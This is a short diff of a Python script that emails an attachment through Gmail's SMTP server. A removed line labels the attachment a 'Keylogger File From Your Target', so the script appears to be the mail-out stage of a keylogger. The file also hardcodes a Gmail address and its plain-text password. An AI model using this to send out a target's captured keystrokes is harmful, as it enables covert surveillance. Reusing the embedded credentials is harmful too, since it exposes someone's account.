@@ -6,7 +6,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 subject = "An email with attachment from Python"
-body = "Keylogger File From Your Target: "
+body = "This is an email with attachment sent from Python"
 sender_email = "zdz.org@gmail.com"
 receiver_email = "zdz.org@gmail.com"
 password = "Zdz282612"
@@ -46,6 +46,5 @@ text = message.as_string()
 # Log in to server using secure context and send email
 context = ssl.create_default_context()
 with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
-    server.login(sender_email, 
-                )
+    server.login(sender_email, password)
     server.sendmail(sender_email, receiver_email, text)
